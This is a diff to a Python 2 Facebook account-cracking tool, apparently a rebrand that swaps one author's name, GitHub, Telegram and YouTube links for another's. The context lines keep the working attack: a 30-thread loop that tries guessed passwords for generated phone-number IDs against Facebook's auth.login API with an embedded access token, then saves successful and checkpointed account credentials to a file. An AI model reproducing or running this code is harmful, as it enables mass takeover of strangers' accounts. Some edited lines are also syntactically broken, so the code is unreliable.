@@ -68,7 +68,7 @@ def tik():
     titik = [
      '.   ', '..  ', '... ']
     for o in titik:
-        print '\r\x1b[1;93mHemt.Cybery\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92..99% \x1b[1;93m' + o,
+        print '\r\x1b[1;93mSaadat\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92..99% \x1b[1;93m' + o,
         sys.stdout.flush()
         time.sleep(1)
 
@@ -80,13 +80,13 @@ cpb = []
 vulnot = '\x1b[31mNot Vuln'
 vuln = '\x1b[32mVuln'
 os.system('clear')
-os.system('toilet -f future  Hemt Cybery')
+os.system('toilet -f future  Saadat')
 print '\x1b[1;96m A\xea\x9c\xb0\xc9\xa2\xca\x9c\xe1\xb4\x80\xc9\xb4\xc9\xaas\xe1\xb4\x9b\xe1\xb4\x80\xc9\xb4 F\xe1\xb4\x80\xe1\xb4\x84\xe1\xb4\x87\xca\x99\xe1\xb4\x8f\xe1\xb4\x8f\xe1\xb4\x8b A\xe1\xb4\x84\xe1\xb4\x84\xe1\xb4\x8f\xe1\xb4\x9c\xc9\xb4\xe1\xb4\x9b C\xca\x9f\xe1\xb4\x8f\xc9\xb4\xe1\xb4\x87\xca\x80'
 print 44 * '\x1b[1;91m\xe2\x94\x80'
 time.sleep(0.09)
-print '\x1b[1;92m Author  \x1b[1;96m    : \x1b[1;93m  Hemt Cybery'
-print '\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  https://github.com/HemtKhan'
-print '\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  https://t.me/HemtHack'
+print '\x1b[1;92m Author  \x1b[1;96m    : \x1b[1;93m  Raziqullah Saadat'
+print '\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  Raziq-AFG'
+print '\x1b[1;92m  Youtube  \x1b[1;96m  : \x1b[1;93m  https://www.youtube.com/@Saadat.Technical'
 time.sleep(0.05)
 print 44 * '\x1b[1;91m\xe2\x94\x80'
 jalan('\x1b[1;92mINPUT USERNAME & PASSWORD')
@@ -117,36 +117,27 @@ while loop == 'true':
 def lisensi():
     os.system('clear')
     login()
-logo =                                          ("""   
- 8888888b.   .d8888b.  888    888 
-888   Y88b d88P  Y88b 888    888 
-888    888 Y88b.      888    888 
-888   d88P  "Y888b.   8888888888 
-8888888P"      "Y88b. 888    888 
-888 T88b         "888 888    888 
-888  T88b  Y88b  d88P 888    888 
-888   T88b  "Y8888P"  888    888  
 
 def login():
     os.system('clear')
-    os.system('toilet CLONE AFG FB ACCOUNT -f future --filter metal')
+    os.system('toilet CLONE Saadat FB ACCOUNT -f future --filter metal')
     print '\x1b[1;96m A\xea\x9c\xb0\xc9\xa2\xca\x9c\xe1\xb4\x80\xc9\xb4\xc9\xaas\xe1\xb4\x9b\xe1\xb4\x80\xc9\xb4 F\xe1\xb4\x80\xe1\xb4\x84\xe1\xb4\x87\xca\x99\xe1\xb4\x8f\xe1\xb4\x8f\xe1\xb4\x8b A\xe1\xb4\x84\xe1\xb4\x84\xe1\xb4\x8f\xe1\xb4\x9c\xc9\xb4\xe1\xb4\x9b C\xca\x9f\xe1\xb4\x8f\xc9\xb4\xe1\xb4\x87\xca\x80'
     print '\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
     time.sleep(0.05)
-    jalan('\xe2\x95\x91\x1b[1;92m Author  \x1b[1;96m    : \x1b[1;93m  Hemt Cybery         \xe2\x95\x91')
-    jalan('\xe2\x95\x91\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  https://github.com/HemtKhan \xe2\x95\x91')
-    jalan('\xe2\x95\x91\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  https://t.me/hemt_hack \xe2\x95\x91')
+    jalan('\xe2\x95\x91\x1b[1;92m Author  \x1b[1;96m    : \x1b[1;93m Raziqullah Saadat         \xe2\x95\x91')
+    jalan('\xe2\x95\x91\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  Raziq-AFG \xe2\x95\x91')
+    jalan('\xe2\x95\x91\x1b[1;92m Youtube  \x1b[1;96m  : \x1b[1;93m  https://www.youtube.com/@Saadat.Technical \xe2\x95\x91')
     time.sleep(0.05)
     print '\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
-    print '\x1b[1;91m[\x1b[1;93m01\x1b[1;91m]\x1b[1;92m 7 DIGIT CRACKER'
+    print '\x1b[1;91m[\x1b[1;93m01\x1b[1;91m]\x1b[1;92m 7 AFG CRACKER'
     time.sleep(0.05)
-    print '\x1b[1;91m[\x1b[1;93m02\x1b[1;91m]\x1b[1;92m 8 DIGIT CRACKER'
+    print '\x1b[1;91m[\x1b[1;93m02\x1b[1;91m]\x1b[1;92m 8 AFG Random CRACKER'
     time.sleep(0.05)
-    print '\x1b[1;91m[\x1b[1;93m03\x1b[1;91m]\x1b[1;92m 9 DIGIT CRACKER'
+    print '\x1b[1;91m[\x1b[1;93m03\x1b[1;91m]\x1b[1;92m 9 AFG New CRACKER'
     time.sleep(0.05)
-    print '\x1b[1;91m[\x1b[1;93m04\x1b[1;91m]\x1b[1;92m 10 DIGIT CRACKER'
+    print '\x1b[1;91m[\x1b[1;93m04\x1b[1;91m]\x1b[1;92m 10 AFG Olds CRACKER'
     time.sleep(0.05)
-    print '\x1b[1;91m[\x1b[1;93m05\x1b[1;91m]\x1b[1;92m 11 DIGIT CRACKER'
+    print '\x1b[1;91m[\x1b[1;93m05\x1b[1;91m]\x1b[1;92m 11 All country CRACKER'
     time.sleep(0.05)
     print '\x1b[1;91m[\x1b[1;93m06\x1b[1;91m]\x1b[1;92m More Tools'
     time.sleep(0.05)
@@ -181,17 +172,18 @@ def login_pilih():
 
 def More():
     os.system('clear')
-    os.system('xdg-open https://github.com/HemtKhan')
+    os.system('xdg-open https://www.youtube.com/@Saadat.Technicaln')
     os.system('login')
 
 
 def Find():
     os.system('clear')
     os.system('toilet -f future Find Me --filter border')
-    jalan('\x1b[1;93m Author\x1b[1;96m     :\x1b[1;93m   Hemt Cybery')
-    jalan('\x1b[1;92m Github\x1b[1;96m     :\x1b[1;92m   HemtKhan')
-    jalan('\x1b[1;96m Telegram\x1b[1;96m   :\x1b[1;96m   https://t.me/HemtHack')
-    os.system('xdg-open https://t.me/HemtHack')
+    jalan('\x1b[1;93m Author\x1b[1;96m     :\x1b[1;93m   Raziqullah Saadat')
+    jalan('\x1b[1;92m Github\x1b[1;96m     :\x1b[1;92m   Raziq-AFG')
+    jalan('\x1b[1;96m Youtube\x1b[1;96m   :\x1b[1;96m   Saadat.Technical')
+    jalan('\x1b[1;96m Version\x1b[1;96m   :\x1b[1;96m     2.4
+    os.system('xdg-open https://www.youtube.com/@Saadat.Technical')
     os.system('login')
 
 
@@ -201,13 +193,13 @@ def Exit():
 
 def Zeek():
     os.system('clear')
-    os.system('toilet AFG  CRAK --filter gay -f standard')
+    os.system('toilet Saadat  CRAK --filter gay -f standard')
     print '\x1b[1;96m A\xea\x9c\xb0\xc9\xa2\xca\x9c\xe1\xb4\x80\xc9\xb4\xc9\xaas\xe1\xb4\x9b\xe1\xb4\x80\xc9\xb4 F\xe1\xb4\x80\xe1\xb4\x84\xe1\xb4\x87\xca\x99\xe1\xb4\x8f\xe1\xb4\x8f\xe1\xb4\x8b A\xe1\xb4\x84\xe1\xb4\x84\xe1\xb4\x8f\xe1\xb4\x9c\xc9\xb4\xe1\xb4\x9b C\xca\x9f\xe1\xb4\x8f\xc9\xb4\xe1\xb4\x87\xca\x80'
     print 50 * '\x1b[1;91m-'
     time.sleep(0.05)
-    print '\x1b[1;92m Author  \x1b[1;96m    : \x1b[1;93m  Hemt Cybery'
-    print '\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  https://github.com/HemtKhan'
-    print '\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  https://t.me/hemt_hack'
+    print '\x1b[1;92m Author  \x1b[1;96m    : \x1b[1;93m  Raziqullah Saadat'
+    print '\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  Raziq-AFG'
+    print '\x1b[1;92m Youtube  \x1b[1;96m  : \x1b[1;93m  Saadat.Technical'
     time.sleep(0.05)
     print 50 * '\x1b[1;91m-'
     time.sleep(0.05)
@@ -398,7 +390,7 @@ def action():
     elif peak == '11':
         os.system('clear')
         os.system('toilet -f future Follow Me --filter border')
-        os.system('xdg-open https://t.me/HemtHack')
+        os.system('xdg-open https://www.youtube.com/@Saadat.Technical')
         os.system('exit')
     elif peak == '00':
         login()
@@ -424,13 +416,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;91m[\x1b[1;92mHemt CyberySuccesful\x1b[1;91m]   ' + k + c + user + '  |  ' + pass1
+                print '\x1b[1;91m[\x1b[1;92Saadat Ok\x1b[1;91m]   ' + k + c + user + '  |  ' + pass1
                 okb = open('save/cloned.txt', 'a')
                 okb.write(k + c + user + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[\x1b[1;96mHemt CyberyChekpoint\x1b[1;91m] ' + k + c + user + '  |  ' + pass1
+                print '\x1b[1;91m[\x1b[1;96mSaadat cp\x1b[1;91m] ' + k + c + user + '  |  ' + pass1
                 cps = open('save/cloned.txt', 'a')
                 cps.write(k + c + user + pass1 + '\n')
                 cps.close()
@@ -440,13 +432,13 @@ def action():
                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\x1b[1;91m[\x1b[1;92mHemt CyberySuccesful\x1b[1;91m]   ' + k + c + user + '  |  ' + pass2
+                    print '\x1b[1;91m[\x1b[1;92mSaadatSuccesful\x1b[1;91m]   ' + k + c + user + '  |  ' + pass2
                     okb = open('save/cloned.txt', 'a')
                     okb.write(k + c + user + pass2 + '\n')
                     okb.close()
                     oks.append(c + user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;91m[\x1b[1;96mHemt CyberyChekpoint\x1b[1;91m] ' + k + c + user + '  |  ' + pass2
+                    print '\x1b[1;91m[\x1b[1;96mSaadat cp\x1b[1;91m] ' + k + c + user + '  |  ' + pass2
                     cps = open('save/cloned.txt', 'a')
                     cps.write(k + c + user + pass2 + '\n')
                     cps.close()
@@ -456,13 +448,13 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;91m[\x1b[1;92mHemt CyberySuccesful\x1b[1;91m]   ' + k + c + user + '  |  ' + pass3
+                        print '\x1b[1;91m[\x1b[1;92mSaadat Ok\x1b[1;91m]   ' + k + c + user + '  |  ' + pass3
                         okb = open('save/cloned.txt', 'a')
                         okb.write(k + c + user + pass3 + '\n')
                         okb.close()
                         oks.append(c + user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;91m[\x1b[1;96mHemt CyberyChekpoint\x1b[1;91m] ' + k + c + user + '  |  ' + pass3
+                        print '\x1b[1;91m[\x1b[1;96mSaadatcp\x1b[1;91m] ' + k + c + user + '  |  ' + pass3
                         cps = open('save/cloned.txt', 'a')
                         cps.write(k + c + user + pass3 + '\n')
                         cps.close()
@@ -473,9 +465,9 @@ def action():
     p = ThreadPool(30)
     p.map(main, id)
     print 50 * '\x1b[1;91m-'
-    print 'Ali~CyberyProcess Has Been Completed\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92...100%'
+    print 'SaadatProcess Has Been Completed\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92...100%'
     print 'Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
-    print 'Ali Cybery.TM Cloned Accounts Has Been Saved : save/cloned.txt'
+    print 'Saadat.TM Cloned Accounts Has Been Saved : save/cloned.txt'
     print ''
     print '\n    \n    \n    \n    \n\n\x1b[1;91mThanks \x1b[1;97mUseing My CLONE FB Tool\n\x1b[1;92m My Telegram\x1b[1;97m@t.me/hemt_hack\n\x1b[1;93mGitHub\x1b[1;97mHemtKhan\n\x1b[1;94mInstagram\x1b[1;97m\xe2\x88\x86@\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97'
     raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
